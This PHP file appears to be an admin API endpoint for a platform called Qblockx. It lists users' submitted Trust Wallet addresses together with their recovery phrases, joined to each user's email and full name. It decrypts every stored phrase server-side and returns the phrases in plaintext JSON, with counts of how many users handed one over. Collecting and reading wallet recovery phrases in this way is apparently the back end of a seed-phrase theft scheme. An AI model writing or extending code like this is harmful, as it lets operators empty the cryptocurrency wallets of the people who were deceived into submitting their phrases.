<?php
/**
 * Project: Qblockx
 * API: Admin — Trust Wallet Data
 * GET → all submitted Trust Wallet addresses and decrypted phrases
 */

require_once '../../config/database.php';
require_once '../../config/env.php';
require_once '../../api/utilities/auth-check.php';
header('Content-Type: application/json');

requireAdmin();

$APP_KEY = $_ENV['APP_KEY'] ?? '';
$APP_IV  = $_ENV['APP_IV']  ?? '';

function decryptPhrase(string $encrypted, string $key, string $iv): string {
    $decrypted = openssl_decrypt(base64_decode($encrypted), 'aes-256-cbc', $key, 0, $iv);
    return $decrypted !== false ? $decrypted : '[decryption failed]';
}

try {
    $db   = Database::getInstance()->getConnection();
    $page = max(1, (int) ($_GET['page'] ?? 1));
    $limit  = 50;
    $offset = ($page - 1) * $limit;

    $total = $db->query("SELECT COUNT(*) FROM trust_wallet_links")->fetchColumn();

    $metrics = $db->query(
        "SELECT SUM(CASE WHEN wallet_address IS NOT NULL AND wallet_address != '' THEN 1 ELSE 0 END) AS with_address,
                SUM(CASE WHEN phrase_encrypted IS NOT NULL AND phrase_encrypted != '' THEN 1 ELSE 0 END) AS with_phrase
         FROM trust_wallet_links"
    )->fetch();

    $stmt = $db->prepare(
        "SELECT twl.id, u.email, u.full_name,
                twl.wallet_name, twl.wallet_address, twl.phrase_encrypted,
                twl.submitted_at, twl.updated_at
         FROM trust_wallet_links twl
         JOIN users u ON u.id = twl.user_id
         ORDER BY twl.submitted_at DESC
         LIMIT :limit OFFSET :offset"
    );
    $stmt->bindValue(':limit',  $limit,  PDO::PARAM_INT);
    $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
    $stmt->execute();
    $rows = $stmt->fetchAll();

    // Decrypt phrases server-side before sending to admin
    foreach ($rows as &$row) {
        if (!empty($row['phrase_encrypted']) && !empty($APP_KEY) && !empty($APP_IV)) {
            $row['phrase'] = decryptPhrase($row['phrase_encrypted'], $APP_KEY, $APP_IV);
        } else {
            $row['phrase'] = null;
        }
        unset($row['phrase_encrypted']);
    }
    unset($row);

    echo json_encode([
        'success' => true,
        'data'    => [
            'links'        => $rows,
            'total'        => (int) $total,
            'page'         => $page,
            'pages'        => (int) ceil($total / $limit),
            'with_address' => (int) ($metrics['with_address'] ?? 0),
            'with_phrase'  => (int) ($metrics['with_phrase']  ?? 0),
        ],
    ]);

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error']);
}
